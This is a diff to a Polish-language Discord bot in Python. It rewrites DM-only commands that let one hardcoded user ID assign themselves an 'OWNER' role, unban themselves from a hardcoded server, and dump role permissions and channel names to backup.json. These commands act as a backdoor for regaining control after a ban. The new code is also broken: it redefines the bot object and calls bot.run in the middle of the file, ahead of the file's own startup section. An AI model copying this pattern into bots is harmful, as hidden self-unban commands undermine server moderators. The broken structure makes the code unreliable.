@@ -636,74 +636,80 @@ async def opinia(
 
     await ctx.respond("✅ Twoja opinia została dodana!", ephemeral=True)
     
-OWNER_ID = 1062638557174452255
-ROLE_OWNER = "OWNER"
-GUILD_ID = 1453411007010439168
+import discord
+from discord.ext import commands
+import json
 
-# ===== KOMENDY W DM TYLKO DLA CIEBIE =====
+OWNER_ID = 1062638557174452255
+GUILD_ID = 1453411007010439168
+ROLE_OWNER = "OWNER"
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+# Listener na DM
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+
+    if isinstance(message.channel, discord.DMChannel):
+        ctx = await bot.get_context(message)
+        await bot.invoke(ctx)
+    else:
+        await bot.process_commands(message)
+
+# !roleme
 @bot.command()
 async def roleme(ctx):
     if ctx.author.id != OWNER_ID:
         return await ctx.send("❌ Nie masz dostępu do tej komendy.")
-    
     guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        return await ctx.send("❌ Nie mogę znaleźć serwera!")
-    
+    member = guild.get_member(ctx.author.id)
     role = discord.utils.get(guild.roles, name=ROLE_OWNER)
     if not role:
         role = await guild.create_role(name=ROLE_OWNER)
-    
-    member = guild.get_member(ctx.author.id)
-    if not member:
-        return await ctx.send("❌ Nie mogę znaleźć Cię na serwerze.")
-    
     await member.add_roles(role)
-    await ctx.send(f"✅ Rola {ROLE_OWNER} nadana na serwerze {guild.name}.")
+    await ctx.send(f"✅ Nadano rolę {ROLE_OWNER}")
 
+# !unbanme
 @bot.command()
 async def unbanme(ctx):
     if ctx.author.id != OWNER_ID:
-        return await ctx.send("❌ Nie masz dostępu do tej komendy.")
-
+        return await ctx.send("❌ Nie masz dostępu.")
     guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        return await ctx.send("❌ Nie mogę znaleźć serwera!")
+    bans = await guild.bans()
+    for ban_entry in bans:
+        if ban_entry.user.id == OWNER_ID:
+            await guild.unban(ban_entry.user)
+            await ctx.send("✅ Odbanowano Cię na serwerze!")
+            return
+    await ctx.send("ℹ️ Nie byłeś zbanowany.")
 
-    user = await bot.fetch_user(ctx.author.id)
-    try:
-        await guild.unban(user)
-    except:
-        pass  # jeśli nie był zbanowany, ignoruj
-    invite = await guild.text_channels[0].create_invite(max_age=3600, max_uses=1)
-    await ctx.send(f"✅ Odbanowany i oto Twój link do serwera: {invite}")
-
-# Prosty backup serwera – tylko Ty w DM
+# !backup create
 @bot.command()
-async def backup(ctx, action=None):
+async def backup(ctx, arg=None):
     if ctx.author.id != OWNER_ID:
-        return await ctx.send("❌ Nie masz dostępu do tej komendy.")
-
+        return await ctx.send("❌ Nie masz dostępu.")
     guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        return await ctx.send("❌ Nie mogę znaleźć serwera!")
 
-    if action == "create":
+    if arg == "create":
         data = {
-            "name": guild.name,
-            "id": guild.id,
-            "roles": [role.name for role in guild.roles],
-            "channels": [channel.name for channel in guild.channels],
-            "owner": guild.owner.name if guild.owner else None
+            "roles": [{ "name": r.name, "permissions": r.permissions.value } for r in guild.roles],
+            "channels": [{ "name": c.name, "type": str(c.type) } for c in guild.channels]
         }
-        # Zapisz do pliku lokalnie – np. backup.json
-        import json
         with open("backup.json", "w", encoding="utf-8") as f:
             json.dump(data, f, ensure_ascii=False, indent=4)
-        await ctx.send("✅ Backup serwera utworzony! (backup.json)")
-
+        await ctx.send("✅ Backup utworzony do backup.json")
     else:
-        await ctx.send("❌ Niepoprawna akcja. Użyj: `!backup create`")
+        try:
+            with open("backup.json", "r", encoding="utf-8") as f:
+                data = json.load(f)
+            await ctx.send(f"📄 Backup istnieje. Role: {len(data['roles'])}, Kanały: {len(data['channels'])}")
+        except FileNotFoundError:
+            await ctx.send("❌ Nie znaleziono backupu. Użyj `!backup create` aby go utworzyć.")
+
+bot.run("YOUR_TOKEN_HERE")
     
 # =========================================================
 # START BOTA
